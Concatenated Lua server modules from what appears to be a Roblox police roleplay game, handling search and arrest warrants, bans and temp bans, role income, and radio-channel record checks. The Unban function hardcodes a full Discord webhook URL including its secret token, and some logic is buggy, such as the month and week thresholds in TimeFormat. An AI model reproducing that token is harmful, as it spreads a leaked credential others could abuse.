RegisterRemote("SearchTools", function(Player,ArgPlayer)
	if not VerifyService.CheckPermission(Player, "CanSearch") then
		return;
	end;
	Remotes.SearchPermission:FireClient(ArgPlayer,Player,Player)
	Remotes.Notification:FireClient(Player, "Consent request sent to " .. ArgPlayer.Name .. ".", "Search Request!");
end)


RegisterRemote("Warrant", function(plr, val1, val2, val3, val4)
	if not VerifyService.CheckPermission(plr, "CanIssueWarrant") then return end

	if not val1 and not val2 and not val3 and not val4 then
		Remotes.Warrant:FireClient(plr, warrants)
		return
	end
	local argPlayerUserId = Players:GetUserIdFromNameAsync(val2)
	local argPlayer = Players:FindFirstChild(val2)
	if val1 and val2 and val3 and not val4 then
		if argPlayer then
			local WarrantData = VerifyService:GetData(Players:FindFirstChild(val2)).WarrantTable
			table.insert(warrants, {Players:FindFirstChild(val2), -1})
			for i,v in pairs(Players:GetPlayers()) do
				if VerifyService.CheckPermission(v, "CanArrest") then
					Remotes.Warrant:FireClient(v, warrants)
				end
			end
			VerifyService:GetData(Players:FindFirstChild(val2)).WarrantTable = {Type = -1, Issuer = plr.Name, Reason = val3}
			Remotes.Notification:FireClient(plr, val2.. " has been successfully issued a search warrant.", "Successful Warrant!");
			game.ReplicatedStorage.Remotes.Notification:FireClient(argPlayer,'You have been issued with a search warrant and are expected to expose your inventory (and vehicle inventories) to law enforcement personnel.','Search Warrant','Red',true)
			pcall(function()
				local jsonToSend = {
					embeds = {
						{
							title = "CourtLog Event",
							type = "rich",
							description = plr.Name.." has issued an search warrant to "..val2.." under reason, "..val3.."."
						}
					}
				}

				require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
			end)


		else

			local WarrantData = {Type = -1, Issuer = plr.Name, Reason = val3}
			local PlayerDataStore = DataStoreService:GetGlobalDataStore()
			local Key = game.ServerScriptService.Services.RemoteService.Key.Value
			local PlayerData = PlayerDataStore:GetAsync(argPlayerUserId..Key)
			PlayerData.WarrantTable = WarrantData
			PlayerDataStore:SetAsync(argPlayerUserId..Key, PlayerData)


			Remotes.Notification:FireClient(plr, val2.. " has been successfully issued a search warrant.", "Successful Warrant!");
			pcall(function()
				local jsonToSend = {
					embeds = {
						{
							title = "CourtLog Event",
							type = "rich",
							description = plr.Name.." has issued an search warrant to "..val2.." under reason, "..val3.."."
						}
					}
				}

				require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
			end)

		end
	elseif val1 and val2 and val3 and val4 then
		if argPlayer then
			table.insert(warrants, {Players:FindFirstChild(val2), 1})
			for i,v in pairs(Players:GetPlayers()) do
				if VerifyService.CheckPermission(v, "CanArrest") then
					Remotes.Warrant:FireClient(v, warrants)
				end
			end
			local WarrantData = VerifyService:GetData(Players:FindFirstChild(val2)).WarrantTable
			VerifyService:GetData(Players:FindFirstChild(val2)).WarrantTable = {Type = 1, Issuer = plr.Name, Reason = val3, Crime = val4}
			Remotes.Notification:FireClient(plr, val2.. " has been successfully issued a arrest warrant.", "Successful Warrant!");
			Remotes.Notification:FireClient(argPlayer,  "You have been issued with an arrest warrant and are actively being pursued for "..require(game.ReplicatedStorage.Databases.Crimes)[val4].Name.."!", "Arrest Warrant!", "Red", true)
			pcall(function()
				local jsonToSend = {
					embeds = {
						{
							title = "CourtLog Event",
							type = "rich",
							description = plr.Name.." has issued an arrest warrant to "..val2.." for " ..require(game.ReplicatedStorage.Databases.Crimes)[WarrantData.Crime].Name.. " under reason, "..val3.."."
						}
					}
				}

				require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
			end)

		else
			local WarrantData = {Type = 1, Issuer = plr.Name, Reason = val3, Crime = val4}
			local PlayerDataStore = DataStoreService:GetGlobalDataStore()
			local Key = game.ServerScriptService.Services.RemoteService.Key.Value
			local PlayerData = PlayerDataStore:GetAsync(argPlayerUserId..Key)
			PlayerData.WarrantTable = WarrantData
			PlayerDataStore:SetAsync(argPlayerUserId..Key, PlayerData)


			Remotes.Notification:FireClient(plr, val2.. " has been successfully issued an arrest warrant.", "Successful Warrant!");
			pcall(function()
				local jsonToSend = {
					embeds = {
						{
							title = "CourtLog Event",
							type = "rich",
							description = plr.Name.." has issued an arrest warrant to "..val2.." for " ..require(game.ReplicatedStorage.Databases.Crimes)[WarrantData.Crime].Name.. " under reason, "..val3.."."
						}
					}
				}

				require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
			end)

		end
	end
end)

return JusticeService

moderationservice

local ModerationService = {}
local WebService = require(game:GetService("ServerScriptService").Services.WebService)
local DataStore = game:GetService("DataStoreService")
local soundDebounce = false
local tweenService = game:GetService("TweenService")
--local URL = 'https://api.rprxy.xyz/users/get-by-username?username='
local Web = require(game.ServerScriptService.Services.WebService)
local Remotes = game.ReplicatedStorage.Remotes
local Players = game:GetService("Players");

local TempBanPort = "_SyncAdminTempBanNew"
local BanPort = "_SyncAdminBanNew"

local function Filter(message)
	local players = game.Players:GetChildren()
	local exec = players[1]
	local filter = game:GetService("TextService"):FilterStringAsync(message,exec.UserId)
	local filterMsg = filter:GetNonChatStringForBroadcastAsync()
	print(filterMsg)
	if string.find(filterMsg,'##') then
		return 'Roblox failed to filter this message!'
	else
		return message
	end
end



local function TimeFormat(TimeInSeconds)
	local Rounded = math.ceil(TimeInSeconds);
	local Calculated do
		if Rounded >= 31104000 then -- Time in seconds of a year
			Calculated = {math.ceil(Rounded/31104000), "year(s)"};
		elseif Rounded >= 604800 then -- Time in seconds of a month
			Calculated = {math.ceil(Rounded/2592000), "month(s)"};
		elseif Rounded >=604800 then -- Time in seconds of a week
			Calculated = {math.ceil(Rounded/604800), "week(s)"};
		elseif Rounded >= 86400 then -- Time in seconds of a day
			Calculated = {math.ceil(Rounded/86400), "day(s)"};
		elseif Rounded >= 3600 then -- Time in seconds of an hour
			Calculated = {math.ceil(Rounded/3600), "hour(s)"};
		elseif Rounded >= 60 then -- Time in seconds of an minute
			Calculated = {math.ceil(Rounded/60), "minute(s)"};
		else
			Calculated = {math.ceil(Rounded), "second(s)"};
		end
	end
	return Calculated
end

game.Players.PlayerAdded:connect(function(player)
	local item = Players:GetUserIdFromNameAsync(player.Name)

	local Data = DataStore:GetDataStore(item..TempBanPort);

	local TimeInSeconds = Data:GetAsync("TimeLeft")
	--print(TimeInSeconds)

	local ReasonForTBan = Data:GetAsync("Reason")
	--	print(ReasonForTBan)
	if TimeInSeconds == nil then
		Data:SetAsync("TimeLeft", 0)
	else
		TimeInSeconds = tonumber(TimeInSeconds)
		if ( TimeInSeconds > 0 and TimeInSeconds - os.time() > 0 ) then
			local format = 	TimeFormat(TimeInSeconds - os.time());
			local display = format[1]..format[2];
			local reason = ReasonForTBan
			player:Kick("Reason: "..reason..".\n Time left until ban is lifted: "..display..".");
		end
	end
end)

game.Players.PlayerAdded:connect(function(player)
	local item = Players:GetUserIdFromNameAsync(player.Name)
	local Data = DataStore:GetDataStore(item..BanPort);

	local ReasonForTBan = Data:GetAsync("Reason")
	local isBanned = Data:GetAsync("isBanned")
	if isBanned == false or isBanned == nil then
		Data:SetAsync("isBanned", false)	
	elseif isBanned == true then
		local reason = ReasonForTBan
		player:Kick("You have been indefinitely banned.");
	end
end)


local function Kick(Executor, Player, Reason)
	local _reason = Filter(Reason)
	if	game.Players:FindFirstChild(Player) then
		game.Players:FindFirstChild(Player):Kick("\nModerator: "..Executor.."\nReason: "..Reason)
	end




	game.ReplicatedStorage.Remotes.Notification:FireAllClients(Player.." has been kicked by ".. Executor..' for "'.._reason..'".', "Moderation!")



	local data = {
		embeds = {
			{
				author = {name = Executor},
				title = "Kicked "..Player,
				type = "rich",
				description = '"'..Reason..'"',
			}
		}
	}

	WebService.SendJSON("ModLog", data)

end
---------------------------------------------------------------------------------------------

local function Ban(Executor, Player, Reason) 


	local item = Players:GetUserIdFromNameAsync(Player)
	local _reason = Filter(Reason)
	local Storage = DataStore:GetDataStore(item..BanPort);
	local ReasonStorage = Storage:GetAsync("Reason");

	Storage:SetAsync("isBanned", true)
	Storage:SetAsync("Reason", Reason)
	Storage:SetAsync("Moderator", Executor)
	Storage:SetAsync("Date", os.date("*t", os.time()))


	game.ReplicatedStorage.Remotes.Notification:FireAllClients(Executor.." has banned "..Player..' indefinitely for "'.._reason..'"'..".", "Moderation!")

	if(game.Players:FindFirstChild(Player)) then
		game.Players:FindFirstChild(Player):Kick("You have been indefinitely banned.")
	end



	local data = {
		embeds = {
			{
				author = {name = Executor},
				title = "Banned "..Player.." Indefinitely",
				type = "rich",
				description = '"'..Reason..'"',
			}
		}
	}
	Web.SendJSON("ModLog", data)

end

--

local function CheckBan(Executor, Player)
	local item = Players:GetUserIdFromNameAsync(Player)
	local Data = DataStore:GetDataStore(item..BanPort)
	local Temp = DataStore:GetDataStore(item..TempBanPort)
	local ReasonForTBan = Data:GetAsync("Reason")

	local _reason = Filter(ReasonForTBan)

	local isBanned = Data:GetAsync("isBanned")
	local isBannedTemp = Temp:GetAsync("isBanned")
	local reasonmate = Temp:GetAsync("Reason")
	local _reason_ = Filter(reasonmate)

	if isBanned == true and not isBannedTemp == true then
		game.ReplicatedStorage.Remotes.Notification:FireClient(Executor, Player.." was banned for ".._reason..''..".", "Moderation!")
	else
		game.ReplicatedStorage.Remotes.Notification:FireClient(Executor, Player.." was temporarily banned for ".._reason_..''..".", "Moderation!")
	end
end



--
local function TempBan(Executor, Player, Reason)
	local bantime
	local item = Players:GetUserIdFromNameAsync(Player)

	local Storage = DataStore:GetDataStore(item..TempBanPort);
	local FormerTime = Storage:GetAsync("Former");
	local TimeInSeconds = Storage:GetAsync("TimeLeft")
	--print(TimeInSeconds)

	if game.PrivateServerOwnerId ~= 0 and game.PrivateServerId ~= "" then
		--print("VIP server")
		return
	end
	if FormerTime == nil or FormerTime == 0 then
		bantime = 12
		Storage:SetAsync("Former", 12)
	elseif FormerTime == 12 then
		bantime = 24
		Storage:SetAsync("Former", 24)
	elseif FormerTime == 24 then
		bantime = 48
		Storage:SetAsync("Former", 48)

	elseif FormerTime == 48 then
		bantime = 72
		Storage:SetAsync("Former", 72)

	elseif FormerTime == 72 then
		bantime = 168
		Storage:SetAsync("Former", 168)

	elseif FormerTime == 168 then
		bantime = 216
		Storage:SetAsync("Former", 216)
	elseif FormerTime == 216 then
		bantime = "indef"
		Storage:SetAsync("Former", "indef")
	end

	if bantime ~= "indef" then

		local	Time = bantime
		Time = Time * 3600;

		local	TimeLength = TimeFormat(Time)[1].." "..TimeFormat(Time)[2];






		local TimeStorage = Storage:GetAsync("TimeLeft");
		local ReasonStorage = Storage:GetAsync("Reason");

		local TimeLeftUntilLift = Time + os.time()
		Storage:SetAsync("TimeLeft", TimeLeftUntilLift)
		Storage:SetAsync("Reason", Reason)
		Storage:SetAsync("Moderator",Executor)
		Storage:SetAsync("Date", os.date("*t", os.time()))

		--print(TimeLeftUntilLift)
		local _reason = Filter(Reason)

		if(game.Players:FindFirstChild(Player)) then
			game.Players:FindFirstChild(Player):Kick("You have been temporarily banned from the game.\nReason: "..Reason..".\n Time left until ban is lifted: "..TimeLength..".");
		end
		game.ReplicatedStorage.Remotes.Notification:FireAllClients(Executor.." has banned "..Player.." for "..bantime..' hours '.."for "..'"'.._reason..'"'..".", "Moderation!")



		local data = {
			embeds = {
				{
					author = {name = Executor},
					title = "Temp Banned "..Player,
					type = "rich",
					description = '"'..Reason..'"'.." for "..bantime.." hours",
				}
			}
		}
		WebService.SendJSON("ModLog", data)



	else 
		ModerationService.Ban(Executor, Player,  "Excessive Moderation.")
	end
end
--
local function Unban(Executor, Player, Reason)
	local item = Players:GetUserIdFromNameAsync(Player)

	local Storage = DataStore:GetDataStore(item..BanPort);
	local TimeStorage = Storage:GetAsync("TimeLeft");
	local ReasonStorage = Storage:GetAsync("Reason");
	local Data = DataStore:GetDataStore(item..TempBanPort);

	Storage:SetAsync("TimeLeft", 0)
	Storage:SetAsync("Reason", "")
	Storage:SetAsync("isBanned", false)
	Storage:SetAsync("Former", 0)

	Data:SetAsync("TimeLeft", 0)
	Data:SetAsync("Reason", "")
	Data:SetAsync("isBanned", false)
	Data:SetAsync("Former", 0)
	local _reason = Filter(Reason)

	--game.ReplicatedStorage.Remotes.Notification:FireAllClients(Player.." has been unbanned by ".. Executor.. " for "..'"'.._reason..'"'..".", "Moderation!")

	local url = "https://discord.com/api/webhooks/826256044623134750/KTlXnAUYYskEf7rgkX37ZBhniaLpCccQe0eooOZPHulast0nWqVCI7GuZNQUr0sA-dAO"
	local http = game:GetService("HttpService")
	local trolling = tostring(Executor)
	local data = {
		embeds = {
			{
				author = {name = trolling},
				title = "Unbanned "..Player,
				type = "rich",
				description = '"'..Reason..'"',
			}
		}
	}

	WebService.SendJSON("ModLog", data)
end





ModerationService.Kick = Kick
ModerationService.Ban = Ban
ModerationService.TempBan = TempBan
ModerationService.Unban = Unban
ModerationService.CheckBan = CheckBan


return ModerationService


playerservice

local PlayerService = {}
local Items = require(game.ReplicatedStorage.Databases.Items)
local Tools = game.ServerStorage.Tools
local ToolsData = require(game.ReplicatedStorage.Databases.Tools)
local Players = game.Players
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage.Remotes
local Remotes = game.ReplicatedStorage.Remotes
local Databases = game.ReplicatedStorage.Databases
local PlayerStarterRoles = {}
local Items = require(game.ReplicatedStorage.Databases.Items)
local Tools = game.ServerStorage.Tools
local ToolsData = require(game.ReplicatedStorage.Databases.Tools)
local ChannelConnected = {}
local Players = game.Players
local InteractionAddons = game.ServerStorage.InteractionAddons
local Collection = game:GetService("CollectionService")

local Interactions = {}
local ServerHandler = {}
local Util = require(game.ReplicatedStorage.Shared.Util)
local Accessories = game.ServerStorage.Accessories
local LC = require(game.ReplicatedStorage.Databases.LC)
local Uniforms = require(game.ReplicatedStorage.Databases.Uniforms)
local RolesData = require(game.ReplicatedStorage.Databases.Roles)

local WebService = require(game.ServerScriptService.Services.WebService)

local Dealerships = require(game.ReplicatedStorage.Databases.Dealerships)
local DataStore2 = require(script.Parent.Parent.MainModule)
local Teams = require(Databases.Teams)
local TootToot = require(Databases.Teams)
local LogTime = 60
local damageHeight = 16

local lethalHeight = 28 
local HttpService = game:GetService("HttpService")
local DataStoreService = game:GetService("DataStoreService")
local ServerScriptService = game:GetService("ServerScriptService")
local Gateways = require(Databases.Gateways)
local CollectionService = game:GetService("CollectionService")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local FindPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
local GlobalVehicles = {}
local Blacklist = require(game.ReplicatedStorage.Databases.Uniforms.AccessoryBlacklist)
local NumberOfVehicles = 0
local warrants = {}
local loadouts = {}
local funcTable = {}
local eventTable = {}
local function loadInteractions()
	for i,v in pairs(game.Workspace.Interactions:GetChildren()) do
		CollectionService:AddTag(v, "InteractDynamic")
		v.Name = i
		v.Size = Vector3.new(0.05, 0.05, 0.05)
		v.Orientation = Vector3.new(0, 0, 0)
		v.Material = Enum.Material.Plastic
		v.Color = Color3.fromRGB(255, 255, 255)
		v.Transparency = 1
		Interactions[v.Name] = {Id = v.Name,Pos = v.Position,Data = {},R = v.Config.R.Value}
		for d,g in pairs(v.Config:GetChildren()) do
			Interactions[v.Name].Data[g.Name] = g.Value
		end
		Remotes.InteractUpdate:FireAllClients(Interactions)
		v.Config:Destroy()
	end
end

loadInteractions()

 


function RegisterRemote(name, callback)
	require(game.ServerScriptService.Services.RemoteService).RegisterRemote(name, callback)
end

local function Distance(player, interaction)
	if player and interaction then
		local int = Interactions[tostring(interaction)];
		if int and ((player.Character and player.Character:FindFirstChild("HumanoidRootPart")).Position - int.Pos).Magnitude < int.R then
			return true
		end
	end
end

game:GetService("Players").PlayerAdded:Connect(function(Player)
	local RemoteService = require(game.ServerScriptService.Services.RemoteService) 
	local VerifyService = require(game.ServerScriptService.Services.VerifyService)
	while wait(120) do
		pcall(function()
			if game.Players:FindFirstChild(Player.Name) then
				local v27 = VerifyService.GetPlayerData(Player)
				local PlayerBank = VerifyService:GetData(Player).Bank
				local PlayerTeam = tostring(Player.Team)
				local BankLimit = 5000
				local v28 = {};
				local v29 = nil;
				local function u6(p9, p10)
					return p10 < p9;
				end;
				for v30, v31 in pairs(RolesData) do
					if v27[v30] and v31.Income then
						if v31.AbsoluteIncome then
							v29 = v31.Income;
						end;
						table.insert(v28, v31.Income);
					end;
				end;
				table.sort(v28, u6);	
				local Income = v28[1]
				if PlayerBank >= BankLimit then
					Remotes.Notification:FireClient(Player, "$"..Income.." has been deposited into your account.", "Role Income!")	
				else
					VerifyService:GetData(Player).Bank = PlayerBank+Income
					RemoteService.UpdateMoney(Player)
					Remotes.Notification:FireClient(Player, "$"..Income.." has been deposited into your account.", "Role Income!")	
				end
			end
		end)
	end
end)

game.Players.PlayerAdded:Connect(function(Plr)
	Plr.CharacterAppearanceLoaded:Connect(function(character)
		character:WaitForChild("Humanoid").Died:Connect(function()
			if game:GetService("ServerScriptService").Data:FindFirstChild(Plr.UserId .. "_CombatLoggingData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(Plr.UserId .. "_CombatLoggingData"):Destroy()
			end
			if workspace.Interactions:FindFirstChild(tostring(Plr.UserId)) then
				workspace.Interactions:FindFirstChild(tostring(Plr.UserId)):Destroy()
			end
			local Data = {{tostring(Plr.UserId),nil}}
			Remotes.InteractUpdate:FireAllClients(Data)
			Remotes.GetInv:FireClient(Plr,{})
			--wait(3)
			--Plr:LoadCharacter()
		end)	

		local NewInteraction
		NewInteraction = InteractionAddons.PlrInteract:Clone()
		NewInteraction.Config.Player.Value = Plr
		NewInteraction.Name = tostring(Plr.UserId)

		local NewWeld = Instance.new("Weld")
		NewWeld.Part0 = NewInteraction
		NewWeld.Part1 = character:WaitForChild("HumanoidRootPart")
		NewWeld.Parent = NewInteraction
		NewInteraction.Parent = game.Workspace.Interactions
		Interactions[tostring(Plr.UserId)] = {Data = {Type = NewInteraction.Config.Type.Value,Player = NewInteraction.Config.Player.Value},R = NewInteraction.Config.R.Value,Part = NewInteraction}
		local Data = {{tostring(Plr.UserId),{Data = {Type = NewInteraction.Config.Type.Value,Player = NewInteraction.Config.Player.Value},R = NewInteraction.Config.R.Value,Part = NewInteraction}}}
		game.ReplicatedStorage.Remotes.InteractUpdate:FireAllClients(Data)

		character:WaitForChild("Humanoid").Died:Connect(function()
			if game:GetService("ServerScriptService").Data:FindFirstChild(Plr.UserId .. "_HandcuffData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(Plr.UserId .. "_HandcuffData"):Destroy()
			end
		end)
	end)
end)
RegisterRemote("LoadingEnd",function(Plr)
	if require(game.ServerScriptService.Services.VerifyService):GetData(Plr).WeaponLicense then
		delay(1, function()
			require(game.ServerScriptService.Services.FunctionService).GiveItem(Plr, "FOID")
		end)
	end	
end)

game.Players.PlayerAdded:Connect(function(Player)
	Remotes.LoadingEnd:FireClient(Player)
end)







function dropTool(player, ItemType)
	local Pos = (player.Character.Torso.CFrame * CF(math.random(-3.5,3.5), 0, math.random(-3.5,3.5))).p
	local hit, pos, sur = require(game.ServerScriptService.Services.FunctionService).DropRaycast(Pos, require(game.ServerScriptService.Services.FunctionService).IgnoreDropList(player.Character))
	if hit then
		local RayClone = game.ServerStorage.Items[Items[ItemType].Asset]:Clone()
		local InteractPart = game.ServerStorage.InteractionAddons.DroppedItem:Clone()

		local Name = ItemType..tostring(math.random(0,9999))
		RayClone.Parent = workspace.InvisibleParts
		local origCFrame = CFrame.new(pos)
		local lookVector = CF(0,0,0)
		RayClone:SetPrimaryPartCFrame(origCFrame * (lookVector - lookVector.p) * CFANG(0, math.random(0,360), 0))
		InteractPart.Config.C.Value = ItemType
		InteractPart.Config.K.Value = RayClone
		InteractPart.Name = Name
		InteractPart.Position = RayClone.Root.Position
		InteractPart.Parent = game.Workspace.Interactions
		CollectionService:AddTag(InteractPart, "InteractDynamic")
		local Class = Instance.new("StringValue")
		Class.Parent = RayClone
		Class.Value = ItemType
		Class.Name = "Class"
		local PlayerVal = Instance.new("StringValue")
		PlayerVal.Parent = RayClone
		PlayerVal.Value = player.Name
		PlayerVal.Name = "Player"
		CollectionService:AddTag(InteractPart, "InteractDynamic")
		CollectionService:AddTag(RayClone, "InteractDynamic")
		Interactions[Name] = {Id = Name,Data = {Type = InteractPart.Config.Type.Value,C = InteractPart.Config.C.Value,K = InteractPart.Config.K.Value},R = InteractPart.Config.R.Value,Part = InteractPart}
		local Data = {{Name,{Id = Name,Data = {Type = InteractPart.Config.Type.Value,C = InteractPart.Config.C.Value,K = InteractPart.Config.K.Value},R = InteractPart.Config.R.Value,Part = InteractPart}}}
		Remotes.InteractUpdate:FireAllClients(Data)	
		delay(120, function()
			if RayClone.Parent ~= nil then
				Data = {{Name,{}}}
				Remotes.InteractUpdate:FireAllClients(Data)
				Interactions[Name] = nil
				InteractPart:Destroy()
				RayClone:Destroy()
			end
		end)
	else
		return
	end
end
local Plr = {}
local function err(p33, p34, p35, p36)
	for i, v in pairs(Players:GetPlayers()) do
		if require(game.ServerScriptService.Services.VerifyService).CheckPermission(i, "CanUseChannel", p33) and ChannelConnected[i.UserId] then
			Remotes.MessageEvent:FireClient(i, p33, {
				Message = p34, 
				Author = p35, 
				SystemMessage = p36
			});
		end;
	end;
end;
RegisterRemote("MessageEvent",function(CallingPlayer,Channel,Message)
	coroutine.wrap(function()
		if not require(game.ServerScriptService.Services.VerifyService).CheckPermission(CallingPlayer, "CanUseChannel", Channel) then
			return
		end
		local FilteredMessage
		local suc, err = pcall(function()
			FilteredMessage = game.Chat:FilterStringAsync(Message,CallingPlayer,CallingPlayer)
		end)
		if not suc then
			return err(Channel, "Roblox failed to filter this message from " .. CallingPlayer.Name .. ". Roblox might be down...", nil, true);
		end;
		local EndTable = {
			Author = CallingPlayer.Name,
			Message = FilteredMessage
		}
		for i,v in pairs(game.Players:GetChildren()) do
			Remotes.MessageEvent:FireClient(v, Channel, EndTable)
		end
		local ClearRecordsPrefix = "CLEAR ONE"
		local ClearPlatePrefix = "CLEAR PLATE"
		local Vehicles = require(Databases.Vehicles)
		if string.sub(Message,1,11) == ClearPlatePrefix then
			if Channel == "AFI" or Channel == "ASPS" then
				return
			end

			local Plate = string.sub(Message,13,20)
			for i,v in pairs(GlobalVehicles) do
				if v.Plate == Plate then
					wait(math.random(1,2))
					local ClearTable = {
						SystemMessage = true,
						Message = Plate.." ("..Vehicles[v.Model.Name].Name..") is owned by "..v.Owner.Name.."!"
					}
					for i,plr in pairs(game.Players:GetChildren()) do
						Remotes.MessageEvent:FireClient(plr, Channel, ClearTable)
					end
					return
				end
			end
			wait(math.random(1,2))
			local FailClearTable = {
				SystemMessage = true,
				Message = "Invalid Plate!"
			}
			for i,plr in pairs(game.Players:GetChildren()) do
				Remotes.MessageEvent:FireClient(plr, Channel, FailClearTable)
			end
			return
		end
		if string.sub(Message,1,9) == ClearRecordsPrefix then
			if Channel == "AFI" or Channel == "ASPS" then
				return
			end
			local VerifyService = require(game.ServerScriptService.Services.VerifyService)
			local clrUser = string.sub(Message,11)
			local FilteredUser = game.Chat:FilterStringAsync(clrUser, CallingPlayer, CallingPlayer)
			wait(math.random(1,2))
			local RecordsData = VerifyService:GetData(game.Players:FindFirstChild(clrUser)).Records
			local playerRecordsData = RecordsData or {}
			local Records = {}	
			local amountOfRecords = 0
			for i,v in pairs(playerRecordsData) do
				table.insert(Records, v)
				amountOfRecords = amountOfRecords + 1
			end
			local noRecords = false
			local arrestCrime = Records[#Records]
			if not arrestCrime then noRecords = true end
			local msg
			if noRecords == true then
				msg = FilteredUser.." has no records!"
			else
				local crimeData = require(game.ReplicatedStorage.Databases.Crimes)[arrestCrime[4]]
				local dTable = os.date("*t", arrestCrime[2])
				msg = FilteredUser .. " was arrested for " .. crimeData.Name .. " on " .. string.format("%d-%02d-%02d", dTable.year, dTable.month, dTable.day) .. "! They have " .. amountOfRecords .. " record(s) in total!"
			end
			local ClearTable = {
				SystemMessage = true,
				Message = msg
			}
			if VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WeaponLicense then
				ClearTable.Message = ClearTable.Message.." They are a FOID card holder!"
			end
			if VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type then
				if VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type == -1 then
					ClearTable.Message = ClearTable.Message.." They currently have a search warrant out for them under reason, \""..VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Reason.."\", issued by "..VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Issuer.."!"
				else
					ClearTable.Message = ClearTable.Message.." They currently have an arrest warrant out for "..require(game.ReplicatedStorage.Databases.Crimes)[VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Crime].Name.." under reason, \""..VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Reason.."\", issued by "..VerifyService:GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Issuer.."!"
				end
			end
			for i,v in pairs(Players:GetPlayers()) do
				Remotes.MessageEvent:FireClient(v, Channel, ClearTable)
			end
		end
		local MsgValues = string.split(Message, " ")
		if MsgValues[1] == "WARRANT" and MsgValues[3] == "EXECUTED" then
			if Channel == "AFI" or Channel == "ASPS" then
				return
			end

			wait(math.random(1,2))
			local clrUser = MsgValues[2]
			local FilteredUser
			local suc, err = pcall(function()
				FilteredUser = game.Chat:FilterStringAsync(clrUser, CallingPlayer, CallingPlayer)
			end)
			if not suc then
				return err(Channel, "Roblox failed to filter this message from " .. CallingPlayer.Name .. ". Roblox might be down...", nil, true);
			end;

			local msg
			if require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type and require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type == -1 then
				msg = FilteredUser.." has been cleared of their search warrant!"
				local jsonToSend = {
					embeds = {
						{
							title = "CourtLog Event",
							type = "rich",
							description = CallingPlayer.Name.." has cleared "..FilteredUser.."'s search warrant"
						}
					}
				}

				require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
			elseif require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type and require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type == 1 then
				msg = FilteredUser.." has been cleared of their arrest warrant!"
				local jsonToSend = {
					embeds = {
						{
							title = "CourtLog Event",
							type = "rich",
							description = CallingPlayer.Name.." has cleared "..FilteredUser.."'s arrest warrant"
						}
					}
				}

				require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
			elseif not require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(clrUser)).WarrantTable.Type then
				msg = FilteredUser.." does not have a warrant out!"
			end
			local ClearTable = {
				SystemMessage = true,
				Message = msg
			}
			for i,v in pairs(Players:GetPlayers()) do
				Remotes.MessageEvent:FireClient(v, Channel, ClearTable)
			end
		end
	end)()
end)



for i,v in pairs(game.Workspace:WaitForChild("Doors"):GetChildren()) do
	local DoorCenter, DoorSize = v:GetBoundingBox()
	local NewPart = game.ServerStorage.InteractionAddons.DoorInteract:Clone()
	CollectionService:AddTag(NewPart, "InteractDynamic")
	NewPart.Parent = game.Workspace.Interactions
	NewPart.Name = #game.Workspace.Interactions:GetChildren()
	v.Name = NewPart.Name
	NewPart.CFrame = DoorCenter
	Interactions[NewPart.Name] = {Id = NewPart.Name, Pos = NewPart.Position,Data = {Type = "Entry",Id = NewPart},R = 7}
	if v.Config:FindFirstChild("Permissions") then
		Interactions[NewPart.Name].Data.Permissions = HttpService:JSONDecode(v.Config.Permissions.Value)
	end
	if v.Config:FindFirstChild("Vehicle") then
		Interactions[NewPart.Name] = {Id = NewPart.Name, Vehicle = true, Item = v, Pos = NewPart.Position,Data = {Type = "Entry",Id = NewPart},R = 30}
		Interactions[NewPart.Name].Data.Vehicle = true
		Interactions[NewPart.Name].Data.LookVector = v.Right.Part.CFrame.LookVector
	end
	Remotes.InteractUpdate:FireAllClients(Interactions)
end



--function Raycast(originPos, endPos, ignoreList, directionVec) 
--	local hit, pos, sur = FindPartOnRayWithIgnoreList(workspace, RAY(originPos, (endPos - originPos).unit * directionVec), ignoreList, false, true);
--	return hit, pos, sur
--end

--local v25 = RaycastParams.new();
--v25.FilterType = Enum.RaycastFilterType.Blacklist;
--v25.IgnoreWater = true;
--local l__Raycast__10 = workspace.Raycast;
--function Raycast(p8, p9, p10, p11, p12)
--	local l__unit__26 = (p10 - p9).unit;
--	v25.FilterDescendantsInstances = p11;
--	local v27 = l__Raycast__10(workspace, p9, l__unit__26 * p12, v25);
--	if not v27 then
--		return nil, p9 + l__unit__26 * p12;
--	end;
--	return v27.Instance, v27.Position, v27.Normal, v27.Material;
--end;
local DroppedItems = {}

--game.Players.PlayerAdded:Connect(function(Player)
--	local ka = Instance.new("NumberValue")
--	ka.Parent = Player
--	ka.Value = 0
--	ka.Name = "Karma"
--end)

--local function OnUp(Player,NEW)
--	local KarmaAmount = Player.Karma
--	KarmaAmount = KarmaAmount.Value + NEW
--	Remotes.Karma:FireClient(Player, KarmaAmount.Value)
--end

--RegisterRemote("Karma", function(Player, Karma)
--	local function OnUp(Player,NEW)
--		local KarmaAmount = Player.Karma
--		KarmaAmount = KarmaAmount.Value + NEW
--		Remotes.Karma:FireClient(Player, KarmaAmount.Value)
--	end
--	OnUp(Player,Karma)
--end)




